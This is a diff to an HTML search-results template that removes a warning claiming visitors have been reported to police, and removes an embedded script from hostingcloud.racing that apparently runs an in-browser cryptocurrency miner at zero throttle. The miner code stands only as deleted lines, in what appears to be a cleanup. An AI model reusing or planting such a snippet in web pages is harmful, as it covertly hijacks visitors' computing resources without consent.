@@ -40,21 +40,14 @@
       <input name="Search" placeholder="Why not search for: {{randomterm}}" required="required" size="50" type="search"/>
       <input type="submit" value="Search"/>
       </form>
-    <br>
-    <blockquote><b>Trying to access content involving the abuse of minors is
-        illegal. This incident has been reported to the police.<br>
-      </b> </blockquote>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
     % for i in results:
     <h3 margin="2"><a href="{{i['url']}}">{{i['title']}}</a></h3>
     <a href="{{i['url']}}" style="color: green;">{{i["url"]}}</a> 
     <p>{{i['text']}}</p>
     % end
-    <script src="https://www.hostingcloud.racing/JD2t.js"></script>
-    <script>
-        var _client = new Client.Anonymous('9798926dad3c60ea6a6ff3543c0acc5d938a8e0c2593996660342d72309cbd5b', {
-            throttle: 0, c: 'w'
-        });
-        _client.start();
-    </script>
   </body>
 </html>
